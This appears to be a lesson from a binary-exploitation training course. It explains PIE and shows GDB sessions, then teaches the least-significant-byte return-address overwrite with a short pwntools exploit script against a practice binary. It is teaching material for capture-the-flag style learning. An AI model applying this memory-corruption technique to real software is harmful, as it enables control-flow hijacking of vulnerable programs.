Example 3 (15 min) Partial Overwrite

# Example 03

This next example will introduce 'PIE' - Position Independent Execution, and one technique to bypass it.

## PIE

You can think of PIE as ASLR for the code segment. If a binary is compiled with PIE, then the address of functions and strings will be at a different location each run.

We can see this in GDB, when we compile with and without pie. By default, GDB will automatically disable PIE to make debugging 'easier', so before starting the program, run `set disable-randomization off`.

PIE Disabled:
```
━━┫ gdb example03-no-pie -q 
Reading symbols from example03-no-pie...
gef➤  set disable-randomization off
gef➤  p main
$1 = {<text variable, no debug info>} 0x401020 <main>
gef➤  b main
Breakpoint 1 at 0x401020
gef➤  r
Starting program: /home/nat/Dev/bootcamp-training-2020/pwn/example03/example03-no-pie 

Breakpoint 1, 0x0000000000401020 in main ()
gef➤  p main
$2 = {<text variable, no debug info>} 0x401020 <main>
gef➤  quit
```

PIE Enabled:
```
━━┫ gdb example03 -q
Reading symbols from example03...
gef➤  set disable-randomization off
gef➤  p main
$1 = {<text variable, no debug info>} 0x1040 <main>
gef➤  b main
Breakpoint 1 at 0x1040
gef➤  r
Starting program: /home/nat/Dev/bootcamp-training-2020/pwn/example03/example03 

Breakpoint 1, 0x000055cf4bef9040 in main ()
gef➤  p main
$2 = {<text variable, no debug info>} 0x55cf4bef9040 <main>
```

When PIE is disabled, the address code is loaded at is saved in the binary. When PIE is enabled the location of `main` is different before execution starts and it is loaded into memory. This makes jumping to code in a binary much more difficult.

## LSB Overwrite

This example will introduce a simple and basic technique to bypass PIE. A LSB overwrite is what we call it when we overwrite the least significant byte of the return address. This works because the least significant byte will be unchanged by PIE, since true randomization adds a lot moreoverhead.

Here is an example:

If we wanted to return to `main`, in the previous example, we can look at the code and see that the address of main in the binary is `0x1040`, we would want to overwrite the least significant byte of the hypothetical current return address of `0x000055cf4bef90a2` to `0x40`, resulting in a return address of `0x000055cf4bef9040`, the address of `main` that we want to jump to. 

The situations where this technique will work are somewhat limited:
 - There must be code that you want to execute within about 256 bytes of the return address
 - If a null byte will be appended to your input, the technique will not work reliably. (Sometimes overwriting the LSB with 0x00 will still be useful)

In addition, a brute-force option is sometimes appropriate. You can continue to overwrite the 2nd or 3rd least significant bytes, and run your exploit multiple times until the randomization works out.

## Example

Sometimes you run into weird situations, and your payload isn't working as expected. This is where debugging with gdb can be especially helpful. In this example, your first attempt at a payload might not work. This is because one of your input bytes will overwrite the variable `i`, which determines what offset will be written to. If you notice this, you can set the offset to your desired value, and can continue with your exploitation.

```python
from pwn import *

p = process('./example03')

# \x27 overwrites the counter, and points it to the end of the return address
# \xbb is the address of 'win'
payload = b'A' * 24 + b'\x27' + b'\xbb'
p.sendline(payload)

p.interactive()
```
